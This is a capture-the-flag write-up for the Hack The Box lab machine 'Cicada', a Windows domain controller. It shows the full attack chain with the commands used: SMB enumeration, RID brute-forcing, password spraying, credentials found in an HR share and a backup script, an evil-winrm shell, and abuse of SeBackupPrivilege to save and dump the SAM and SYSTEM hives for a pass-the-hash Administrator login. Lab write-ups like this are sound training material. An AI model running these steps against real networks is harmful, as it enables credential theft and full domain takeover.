# Cicada

<figure><img src="../../.gitbook/assets/image (891).png" alt=""><figcaption></figcaption></figure>

## Enumeration

```bash
nmap -v -A -O -p- -T4 -Pn -sC permx.htb -oN nmap
```

```bash
Nmap scan report for cicada.htb (10.10.11.35)
Host is up (0.049s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-11 22:22:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
60294/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (88%)
Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.025 days (since Wed Dec 11 09:47:57 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-11T22:23:14
|_  start_date: N/A
|_clock-skew: 6h59m57s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   48.32 ms 10.10.14.1
2   48.88 ms cicada.htb (10.10.11.35)

```

### Port 445 - SMB

Connecting to a SMB share using anonymous user we will find 2 interesting shares:

```bash
smbclient -U '' -L \\\\<IP> 
```

<figure><img src="../../.gitbook/assets/image (892).png" alt=""><figcaption></figcaption></figure>

Share DEV unfortunately is not readable, but we see that HR and IPC$ are readable:

```bash
sudo crackmapexec smb 10.10.11.35 -u 'guest' -p '' --shares
```

<figure><img src="../../.gitbook/assets/image (894).png" alt=""><figcaption></figcaption></figure>

&#x20;so we can try to RID Cycling attack the SMB protocol using "guest" account:

```bash
crackmapexec smb cicada.htb -u guest -p "" --rid-brute
```

<figure><img src="../../.gitbook/assets/image (893).png" alt=""><figcaption></figcaption></figure>

And we will obtain users valid list:

```
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

## Foothold (michael.wrightson)

We can try to access the readable HR share using "guest" account:

<figure><img src="../../.gitbook/assets/image (895).png" alt=""><figcaption></figcaption></figure>

And we will finally obtain a foothold, a valid password for new hire user:\
`Cicada$M6Corpb*@Lp#nZp!8`

Let's see if there are any new employees among those drawn through RID Cycling attack using a Spray Password attack against SMB share with CrackMapExec:

{% code overflow="wrap" %}
```bash
crackmapexec smb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success cicada.htb
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

`cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`

## Privilege Escalation (david.orelious)

With these pair vaild credentials we can enumerate more infos about domain using LDAP protocol:

{% code overflow="wrap" %}
```
ldapdomaindump -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' ldap://cicada.htb
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

`cicada.htb\david.orelious:aRt$Lp#7t*VQ!3`

## Privilege Escalation (emily.oscars)

The DEV share is accessible and readable by `david.orelious` user. Inside it we will find a `Backup_script.ps1` Powershell script containing another pair of credentials:

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

```
cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt
```

Trying to connect using Win-RM we will obtain a shell on Domain Controller and get the user flag:

```bash
evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation (Administrator)

Inside Documents directory there is a Powershell Script:

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

When we run the **`whoami /priv`** command we see that the Emily user has **`SeBackupPrivileges`** that we can use to escalate privileges.

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

This privilege allows the user to read all the files in the system, we will use this to our advantage. We can use this to copy the SAM and SYSTEM file from Windows using the commands:

```powershell
reg save hklm\sam c:\Temp\sam
```

```powershell
reg save hklm\system c:\Temp\system
```



<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

then send this to our attack device using the Evil-WinRM download command, we transfer the file from the Temp directory on the target machine to our Kali Linux Machine:

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

and use secretsdump or pypykatz to extract the hive secrets from the SAM and SYSTEM file.

```bash
pypykatz registry --sam sam system
```

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Finally use evil-winrm with Hash parameter of Administrator to login on DC and obtain root flag :tada:

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>



